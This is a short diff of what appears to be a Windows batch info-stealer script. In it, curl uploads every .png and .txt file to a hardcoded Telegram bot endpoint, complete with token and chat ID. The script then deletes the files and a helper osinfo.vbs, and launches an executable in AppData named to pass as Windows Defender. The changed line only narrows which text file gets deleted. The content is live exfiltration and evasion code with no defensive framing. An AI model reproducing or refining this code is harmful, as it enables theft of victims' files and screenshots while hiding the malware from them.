@@ -71,7 +71,7 @@ for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegr
 for %%# in ("*.txt") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
 
 del /q /s /a *.png
-del /q /s /a *.txt
+del /q /s /a "%username%@computername%.txt"
 del /q /s /a osinfo.vbs
 
 "%AppData%\Microsoft\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
